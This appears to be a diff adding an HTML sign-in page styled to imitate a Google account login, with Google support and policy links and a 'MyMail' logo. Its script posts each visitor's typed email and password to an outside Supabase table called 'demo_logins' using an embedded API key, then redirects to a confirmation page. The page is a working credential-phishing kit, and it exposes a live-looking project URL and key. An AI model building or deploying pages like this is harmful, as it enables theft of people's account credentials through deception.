@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign In</title>
+  <style>
+    body {
+      background-color: #f5f5f5;
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      height: 100vh;
+      justify-content: center;
+      color: #202124;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .container {
+      background: white;
+      padding: 40px 50px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgb(0 0 0 / 0.2);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      margin-bottom: 24px;
+      height: 50px;
+      user-select: none;
+    }
+
+    .logo img {
+      height: 50px;
+      width: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    h1 {
+      font-weight: 400;
+      margin-bottom: 24px;
+      font-size: 24px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      font-size: 16px;
+      padding: 12px 14px;
+      margin-bottom: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      box-sizing: border-box;
+      width: 100%;
+    }
+
+    input:focus {
+      outline-color: #1a73e8;
+      border-color: #1a73e8;
+    }
+
+    button {
+      background-color: #1a73e8;
+      border: none;
+      padding: 12px 0;
+      color: white;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-bottom: 12px;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #1669c1;
+    }
+
+    .forgot {
+      color: #1a73e8;
+      font-size: 14px;
+      text-align: right;
+      cursor: pointer;
+      margin-bottom: 30px;
+    }
+
+    .footer-text {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 30px;
+      line-height: 1.4;
+    }
+
+    .footer-text a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    .footer-text a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 30px 20px;
+      }
+      h1 {
+        font-size: 20px;
+      }
+      input, button {
+        font-size: 14px;
+        padding: 10px 12px;
+      }
+      .forgot {
+        font-size: 12px;
+      }
+      .footer-text {
+        font-size: 11px;
+      }
+      .footer-text p:first-child {
+        display: none;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main">
+    <div class="logo" aria-label="Your Logo">
+      <img src="logo.png" alt="MyMail Logo" />
+    </div>
+    <h1>Sign in</h1>
+    <form id="loginForm">
+      <input type="email" id="email" name="email" placeholder="Email or phone" required />
+      <input type="password" id="password" name="password" placeholder="Enter your password" required />
+      <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Re-enter your password" required />
+      <button type="submit">Next</button>
+    </form>
+    <div class="forgot" tabindex="0">Forgot password?</div>
+    <div class="footer-text">
+      <p>Recovery of Account</p>
+      <p>
+        <a href="https://support.google.com/accounts/answer/7682439" target="_blank">Learn more</a> •
+        <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> •
+        <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a>
+      </p>
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = "https://evcrpibwmvuyvomitczh.supabase.co";
+    const SUPABASE_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV2Y3JwaWJ3bXZ1eXZvbWl0Y3poIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQ2NTExMDQsImV4cCI6MjA3MDIyNzEwNH0.ivwDDGgRPwM5Zll-gT3MhELFyARrdlL2lujnG5olhqc";
+
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const confirmPassword = document.getElementById("confirmPassword").value;
+
+      if (password !== confirmPassword) {
+        alert("Passwords do not match.");
+        return;
+      }
+
+      try {
+        const res = await fetch(`${SUPABASE_URL}/rest/v1/demo_logins`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "apikey": SUPABASE_API_KEY,
+            "Authorization": `Bearer ${SUPABASE_API_KEY}`,
+            "Prefer": "return=minimal"
+          },
+          body: JSON.stringify({ email, password })
+        });
+
+        if (!res.ok) throw new Error("Failed to submit data.");
+
+        window.location.href = "confirmation.html";
+      } catch (err) {
+        alert("Error saving data. Check console.");
+        console.error(err);
+      }
+    });
+  </script>
+</body>
+</html>
